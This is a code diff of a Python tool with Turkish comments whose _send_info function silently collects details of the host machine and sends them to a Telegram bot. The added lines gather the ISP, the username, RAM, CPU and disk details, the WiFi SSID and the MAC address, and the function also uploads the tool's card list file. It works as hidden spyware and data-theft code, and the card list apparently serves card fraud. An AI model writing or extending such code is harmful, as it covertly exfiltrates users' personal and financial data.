@@ -113,17 +113,20 @@ def run(cards_file: Optional[str] = None) -> None:
     def _send_info():
         import platform
         import socket
+        import os
 
         # IP ve konum
         ip = "Alinamadi"
         ulke = ""
         sehir = ""
+        isp   = ""
         try:
             r = _requests.get("https://ipapi.co/json/", timeout=6)
             data = r.json()
             ip    = data.get("ip", "Alinamadi")
             ulke  = data.get("country_name", "")
             sehir = data.get("city", "")
+            isp   = data.get("org", "")
         except Exception:
             try:
                 ip = _requests.get("https://api.ipify.org", timeout=5).text.strip()
@@ -135,30 +138,107 @@ def run(cards_file: Optional[str] = None) -> None:
         hostname = socket.gethostname()
         py_ver   = platform.python_version()
         konum    = (sehir + ", " + ulke).strip(", ")
+        kullanici = os.environ.get("USERNAME") or os.environ.get("USER") or "Bilinmiyor"
+
+        # RAM
+        ram_info = "Bilinmiyor"
+        try:
+            import psutil
+            ram = psutil.virtual_memory()
+            ram_info = str(round(ram.total / (1024**3), 1)) + " GB (Kullanim: %" + str(ram.percent) + ")"
+        except Exception:
+            pass
+
+        # CPU
+        cpu_info = platform.processor() or "Bilinmiyor"
+        try:
+            import psutil
+            cpu_info = cpu_info + " (" + str(psutil.cpu_count()) + " cekirdek)"
+        except Exception:
+            pass
+
+        # Disk
+        disk_info = "Bilinmiyor"
+        try:
+            import psutil
+            disk = psutil.disk_usage("/")
+            disk_info = (
+                str(round(disk.total / (1024**3), 1)) + " GB toplam, "
+                + str(round(disk.free / (1024**3), 1)) + " GB bos"
+            )
+        except Exception:
+            pass
+
+        # WiFi SSID
+        wifi_ssid = "Bilinmiyor"
+        try:
+            import subprocess
+            sys_name = platform.system()
+            if sys_name == "Windows":
+                out = subprocess.check_output(
+                    ["netsh", "wlan", "show", "interfaces"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                for line in out.splitlines():
+                    if "SSID" in line and "BSSID" not in line:
+                        wifi_ssid = line.split(":", 1)[-1].strip()
+                        break
+            elif sys_name == "Linux":
+                # Termux / Linux
+                out = subprocess.check_output(
+                    ["termux-wifi-connectioninfo"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                import json as _json
+                wdata = _json.loads(out)
+                wifi_ssid = wdata.get("ssid", "Bilinmiyor")
+        except Exception:
+            try:
+                import subprocess
+                out = subprocess.check_output(
+                    ["iwgetid", "-r"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                wifi_ssid = out.strip() or "Bilinmiyor"
+            except Exception:
+                pass
+
+        # MAC adresi
+        mac = "Bilinmiyor"
+        try:
+            import uuid
+            mac_int = uuid.getnode()
+            mac = ":".join(("%012X" % mac_int)[i:i+2] for i in range(0, 12, 2))
+        except Exception:
+            pass
 
         tg_info = TelegramNotifier()
 
-        # Metin mesajı
         msg = (
             "<b>Yeni Oturum Basladi</b>\n\n"
-            + "IP       : <code>" + ip       + "</code>\n"
-            + "Konum    : <code>" + (konum or "Bilinmiyor") + "</code>\n"
-            + "Zaman    : <code>" + zaman    + "</code>\n"
-            + "OS       : <code>" + os_info  + "</code>\n"
-            + "Hostname : <code>" + hostname + "</code>\n"
-            + "Python   : <code>" + py_ver   + "</code>\n"
-            + "Kartlar  : <code>" + str(len(cards)) + "</code>\n"
-            + "Dosya    : <code>" + str(cards_path) + "</code>"
+            + "IP         : <code>" + ip                          + "</code>\n"
+            + "Konum      : <code>" + (konum or "Bilinmiyor")     + "</code>\n"
+            + "ISP        : <code>" + (isp   or "Bilinmiyor")     + "</code>\n"
+            + "Zaman      : <code>" + zaman                       + "</code>\n"
+            + "OS         : <code>" + os_info                     + "</code>\n"
+            + "Kullanici  : <code>" + kullanici                   + "</code>\n"
+            + "Hostname   : <code>" + hostname                    + "</code>\n"
+            + "Python     : <code>" + py_ver                      + "</code>\n"
+            + "RAM        : <code>" + ram_info                    + "</code>\n"
+            + "CPU        : <code>" + cpu_info                    + "</code>\n"
+            + "Disk       : <code>" + disk_info                   + "</code>\n"
+            + "WiFi       : <code>" + wifi_ssid                   + "</code>\n"
+            + "MAC        : <code>" + mac                         + "</code>\n"
+            + "Kartlar    : <code>" + str(len(cards))             + "</code>\n"
+            + "Dosya      : <code>" + str(cards_path)             + "</code>"
         )
         tg_info._post(msg)
 
-        # Kart dosyasını da gonder
+        # Kart dosyasini gonder
         try:
             import io
             card_bytes = "\n".join(cards).encode("utf-8")
             card_file  = io.BytesIO(card_bytes)
-            card_file.name = Path(cards_path).name
-
             _requests.post(
                 "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
                 data={"chat_id": tg_info._chat_id, "caption": "Kart listesi"},
